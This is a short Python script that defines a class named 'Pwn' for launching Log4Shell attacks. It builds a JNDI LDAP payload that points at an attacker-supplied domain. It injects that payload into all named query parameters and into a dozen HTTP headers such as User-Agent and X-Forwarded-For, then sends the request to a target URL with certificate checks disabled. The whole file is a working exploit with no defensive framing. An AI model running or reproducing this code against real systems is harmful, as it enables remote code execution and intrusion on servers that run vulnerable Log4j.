import requests
import urllib3


class Pwn:
    def __init__(self, url: str, domain: str, input_params: list):
        self.url = url.strip()
        self.domain = domain
        self.input_params = input_params
        self.payload = "${jndi:ldap://%s/}" % self.domain


    def build_params(self):
        params = dict()
        for param in self.input_params:
            params[param] = self.payload
        return params

    def pwn(self):
        print("Initialising attack...")
        urllib3.disable_warnings()
        params = self.build_params()
        
        print("Starting attack...")
        try:
            
            headers = {
                'User-Agent':self.payload,
                'Referer':self.payload,
                'CF-Connecting_IP':self.payload,
                'True-Client-IP':self.payload,
                'X-Forwarded-For':self.payload,
                'Originating-IP':self.payload,
                'X-Real-IP':self.payload,
                'X-Client-IP':self.payload,
                'Forwarded':self.payload,
                'Client-IP':self.payload,
                'Contact':self.payload,
                'X-Wap-Profile':self.payload,
                'From':self.payload
            }
            requests.get(self.url, headers=headers, params=params, verify=False, timeout=10)
        except:
            return 1
        print("Finished attack...")
        return 0
